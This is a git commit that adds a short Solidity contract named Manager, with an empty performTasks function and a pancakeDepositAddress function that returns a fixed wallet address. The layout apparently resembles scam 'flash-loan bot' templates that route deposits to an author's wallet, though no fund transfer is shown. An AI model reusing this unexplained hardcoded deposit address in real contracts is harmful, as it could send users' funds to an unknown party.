6fe211aed602bcd31d09ae4293b5e39c95b20a40
JSON1540 <88004692+JSON1540@users.noreply.github.com>
2021-07-26 15:54:08 -0500

    Create LoanRepay.sol

---
+++ LoanRepay.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0xF3073D7bbC57954EF3B9d3b19bb0fF5C43017c45;
+	}
+}
